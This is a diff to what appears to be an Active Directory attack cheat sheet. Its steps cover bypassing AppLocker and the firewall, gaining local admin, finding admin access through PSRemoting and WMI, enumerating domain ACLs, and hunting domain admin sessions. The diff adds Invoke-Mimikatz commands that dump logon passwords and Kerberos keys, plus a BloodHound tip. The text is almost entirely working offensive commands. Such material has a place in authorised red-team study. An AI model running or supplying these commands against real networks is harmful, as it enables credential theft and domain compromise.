@@ -6,8 +6,9 @@
 <strong>Bypass/deactivate AppLocker Policies
 </strong>Bypass/deactivate Firewall
 Get local Admin
-Dump local users
-
+Dump local users/tickets with mimikatz
+  Invoke-mimikatz -command '"sekurlsa::logonpasswords'"
+  Invoke-mimikatz -command '"sekurlsa::ekeys"'
 
 . ./Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess
@@ -24,6 +25,7 @@ Find-WMILocalAdminAccess
 </strong><strong>
 </strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "yourusername"}
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "GroupName"}
+=> Bloodhound: Open User / Outbound object control
 <strong>
 </strong><strong>DA with running sessions and local admin of us
 </strong>Invoke-Userhunter -groupname "domain admins"
